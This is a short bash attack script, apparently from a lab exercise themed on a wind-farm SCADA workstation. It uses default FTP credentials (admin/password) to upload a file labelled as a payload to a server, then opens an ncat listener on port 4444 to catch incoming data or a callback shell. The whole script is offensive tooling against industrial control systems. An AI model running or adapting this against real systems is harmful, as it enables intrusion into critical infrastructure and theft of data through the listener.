#!/bin/bash

FTP_SERVER="${FTP_SERVER:-172.16.20.13}"
FTP_USER="admin"
FTP_PASS="password"

PAYLOAD="/scripts/workstation/WindFarm-workstation/init_scada_project.tar.gz"
LOCAL_COPY="/home/output.log"

echo "[+] Uploading payload..."

curl -s -T "$PAYLOAD" ftp://$FTP_USER:$FTP_PASS@$FTP_SERVER/uploads/

ncat -l 4444 > $LOCAL_COPY &
